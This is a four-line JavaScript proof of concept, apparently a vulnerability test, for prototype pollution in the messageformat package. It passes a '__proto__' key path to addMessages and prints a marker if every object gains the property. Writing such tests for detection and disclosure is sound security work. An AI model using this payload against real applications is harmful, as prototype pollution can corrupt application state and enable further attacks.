const clazz = require("messageformat/messages");
let instance = new clazz({ en: {} });
instance.addMessages('test','en',['en','__proto__','pollutedProp']);
console.log({}.pollutedProp !== undefined ? '[POLLUTION_TRIGGERED]':'');